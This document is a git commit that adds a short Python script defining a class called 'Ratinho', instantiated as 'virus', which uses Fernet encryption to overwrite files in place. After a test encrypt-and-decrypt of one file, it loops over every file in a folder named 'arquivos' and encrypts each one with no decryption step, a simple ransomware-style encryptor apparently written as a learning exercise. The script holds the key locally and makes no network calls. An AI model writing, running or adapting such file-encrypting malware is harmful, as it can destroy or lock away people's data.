3ad0f82a563db11c70e8621fedc671c100db55ef
Antônio <82171302+antonionetu@users.noreply.github.com>
2025-08-01 22:37:44 -0300

    Add files via upload

---
+++ script.py
@@ -0,0 +1,51 @@
+import os, glob
+from cryptography.fernet import Fernet
+
+
+class Ratinho:
+    def __init__(self):
+        self.key = Fernet.generate_key()
+        self.fernet = None
+
+
+    def generate_key_file(self):
+        with open('filekey.key', 'wb') as f:
+            f.write(self.key)
+            self.fernet = Fernet(self.key)
+
+    
+    def set_key_file(self, file_name):
+        with open('filekey.key', 'rb') as f:
+            self.key = f.read()
+            self.fernet = Fernet(self.key)
+
+
+    def encrypt(self, file_name):
+        with open(file_name, 'rb') as f:
+            original = f.read()
+
+        encrypted = self.fernet.encrypt(original)
+
+        with open(file_name, 'wb') as f:
+            f.write(encrypted)
+
+
+    def decrypt(self, file_name):
+        with open(file_name, 'rb') as f:
+            encrypted = f.read()
+
+        decrypted = self.fernet.decrypt(encrypted)
+
+        with open(file_name, 'wb') as f:
+            f.write(decrypted)
+
+
+virus = Ratinho()
+virus.set_key_file('filekey.key')
+virus.encrypt('arquivo.txt')
+virus.decrypt('arquivo.txt')
+
+folder_path = 'arquivos'
+for file_name in glob.glob(os.path.join(folder_path, '*.*')):
+    with open(file_name, 'r') as f:
+        virus.encrypt(file_name)
